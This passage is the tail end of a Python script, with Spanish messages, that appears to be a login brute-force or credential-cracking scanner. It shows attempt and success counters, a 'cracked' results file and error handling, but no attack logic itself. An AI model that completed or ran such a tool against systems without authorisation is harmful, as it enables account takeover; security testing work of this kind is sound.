                        print(f"       -> {res['detail']}", file=sys.stderr)

                    if args.delay:
                        time.sleep(args.delay)

            _safe_close(conn)

    except KeyboardInterrupt:
        print("\n[INFO] Interrumpido por el usuario - cortando el scan.")

    print("-" * 60)
    print(f"End of Scan - {now()}")
    print(f"Total attempts: {total_attempts}, Successful: {success_count}")
    if success_count > 0:
        print(f"Results saved to: {cracked_file.absolute()}")


def main() -> None:
    _harden_streams()
    args = parse_args()
    _validate_files(args)
    if args.debug:
        _run(args)
        return
    try:
        _run(args)
    except KeyboardInterrupt:
        print("\n[INFO] Interrumpido por el usuario - cortando el scan.", file=sys.stderr)
        sys.exit(130)
    except FileNotFoundError as e:
        print(f"[ERROR] Archivo no encontrado: {e.filename or e}\n"
              f"        Revisa la ruta (pwd: {Path.cwd()}) y vuelve a intentarlo.",
              file=sys.stderr)
        sys.exit(1)
    except PermissionError as e:
        print(f"[ERROR] Sin permisos suficientes: {e}", file=sys.stderr)
        sys.exit(1)
    except ValueError as e:
        print(f"[ERROR] Argumento invalido: {e}", file=sys.stderr)
        sys.exit(2)
    except Exception as e:
        print(f"[ERROR] {type(e).__name__}: {e}", file=sys.stderr)
        print("        Ejecuta de nuevo con --debug para ver el traceback completo.",
              file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
